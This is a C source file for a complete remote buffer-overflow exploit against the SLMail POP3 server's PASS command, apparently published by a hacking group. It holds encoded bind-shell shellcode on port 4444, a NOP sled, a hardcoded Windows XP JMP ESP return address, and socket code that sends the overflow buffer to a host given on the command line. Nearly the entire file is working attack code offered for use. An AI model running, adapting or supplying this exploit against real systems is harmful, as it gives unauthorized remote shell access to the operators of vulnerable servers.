/*
SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
*/

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

// [*] bind 4444 
unsigned char shellcode[] = 
"\xdd\xc4\xd9\x74\x24\xf4\xb8\xb1\x9a\x86\xc9\x5b\x31\xc9\xb1"
"\x52\x31\x43\x17\x83\xeb\xfc\x03\xf2\x89\x64\x3c\x08\x45\xea"
"\xbf\xf0\x96\x8b\x36\x15\xa7\x8b\x2d\x5e\x98\x3b\x25\x32\x15"
"\xb7\x6b\xa6\xae\xb5\xa3\xc9\x07\x73\x92\xe4\x98\x28\xe6\x67"
"\x1b\x33\x3b\x47\x22\xfc\x4e\x86\x63\xe1\xa3\xda\x3c\x6d\x11"
"\xca\x49\x3b\xaa\x61\x01\xad\xaa\x96\xd2\xcc\x9b\x09\x68\x97"
"\x3b\xa8\xbd\xa3\x75\xb2\xa2\x8e\xcc\x49\x10\x64\xcf\x9b\x68"
"\x85\x7c\xe2\x44\x74\x7c\x23\x62\x67\x0b\x5d\x90\x1a\x0c\x9a"
"\xea\xc0\x99\x38\x4c\x82\x3a\xe4\x6c\x47\xdc\x6f\x62\x2c\xaa"
"\x37\x67\xb3\x7f\x4c\x93\x38\x7e\x82\x15\x7a\xa5\x06\x7d\xd8"
"\xc4\x1f\xdb\x8f\xf9\x7f\x84\x70\x5c\xf4\x29\x64\xed\x57\x26"
"\x49\xdc\x67\xb6\xc5\x57\x14\x84\x4a\xcc\xb2\xa4\x03\xca\x45"
"\xca\x39\xaa\xd9\x35\xc2\xcb\xf0\xf1\x96\x9b\x6a\xd3\x96\x77"
"\x6a\xdc\x42\xd7\x3a\x72\x3d\x98\xea\x32\xed\x70\xe0\xbc\xd2"
"\x61\x0b\x17\x7b\x0b\xf6\xf0\x44\x64\xe1\xce\x2d\x77\x11\xde"
"\xf1\xfe\xf7\x8a\x19\x57\xa0\x22\x83\xf2\x3a\xd2\x4c\x29\x47"
"\xd4\xc7\xde\xb8\x9b\x2f\xaa\xaa\x4c\xc0\xe1\x90\xdb\xdf\xdf"
"\xbc\x80\x72\x84\x3c\xce\x6e\x13\x6b\x87\x41\x6a\xf9\x35\xfb"
"\xc4\x1f\xc4\x9d\x2f\x9b\x13\x5e\xb1\x22\xd1\xda\x95\x34\x2f"
"\xe2\x91\x60\xff\xb5\x4f\xde\xb9\x6f\x3e\x88\x13\xc3\xe8\x5c"
"\xe5\x2f\x2b\x1a\xea\x65\xdd\xc2\x5b\xd0\x98\xfd\x54\xb4\x2c"
"\x86\x88\x24\xd2\x5d\x09\x54\x99\xff\x38\xfd\x44\x6a\x79\x60"
"\x77\x41\xbe\x9d\xf4\x63\x3f\x5a\xe4\x06\x3a\x26\xa2\xfb\x36"
"\x37\x47\xfb\xe5\x38\x42";

void exploit(int sock) {
      FILE *test;
      int *ptr;
      char userbuf[] = "USER madivan\r\n";
      char evil[3001];
      char buf[3012];
      char receive[1024];
      char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90"
                       "\x90\x90\x90\x90\x90\x90\x90\x90";
      memset(buf, 0x00, 3012);
      memset(evil, 0x00, 3001);


      //ptr = &evil;
      //memset(evil, 0x41, 2608);
      //ptr = ptr + 652; // Posiciona em 2608
      //memset(ptr, 0x42, 4); // Preenches 4 Bs
      //ptr = ptr + 2; // Posiciona em 2612
      //memset(ptr, 0x43, 8); // Preenches 8 Cs
      //ptr = ptr + 2; // Posiciona em 2620
      //memset(ptr, 0x44, 280); // Preenches 280 Ds
 
      //printf("[+] %s", evil);

      memset(evil, 0x41, 3000);
      ptr = &evil;
      ptr = ptr + 652; // 2608 
      memcpy(ptr, &nopsled, 16);
      ptr = ptr + 4;
      memcpy(ptr, &shellcode, 351);
      *(long*)&evil[2606] = 0x7CB41020; // JMP ESP XP "7C B4 10 20" FFE4

      // banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // user
      printf("[+] Sending Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // passwd
      printf("[+] Sending Evil buffer...\n");
      sprintf(buf, "PASS %s\r\n", evil);
      //test = fopen("test.txt", "w");
      //fprintf(test, "%s", buf);
      //fclose(test);
      send(sock, buf, strlen(buf), 0);
      printf("[*] Done! Connect to the host on port 4444...\n\n");
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}
